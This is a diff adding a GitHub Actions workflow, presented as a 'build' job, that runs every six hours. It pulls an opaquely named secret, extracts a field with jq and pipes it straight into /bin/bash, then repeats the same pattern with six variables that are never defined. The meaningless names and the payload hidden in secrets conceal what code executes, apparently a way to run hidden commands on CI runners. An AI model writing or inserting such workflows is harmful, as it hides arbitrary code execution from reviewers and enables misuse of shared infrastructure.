@@ -1,0 +1,24 @@
+name: wangwenyuan9371
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangwenyuan9371
+        env:
+          y94942: ${{ secrets.y94942 }}
+        run: |
+          echo $y94942 | jq -r .ve695 | /bin/bash
+          echo $wn8 | jq -r .chrm27 | /bin/bash
+          echo $a481 | jq -r .ikhl18194 | /bin/bash
+          echo $bpez8457 | jq -r .d944 | /bin/bash
+          echo $lo7 | jq -r .iml430 | /bin/bash
+          echo $vvibk06 | jq -r .jwgxf9265 | /bin/bash
+          echo $npwak02 | jq -r .jzw82136 | /bin/bash
+
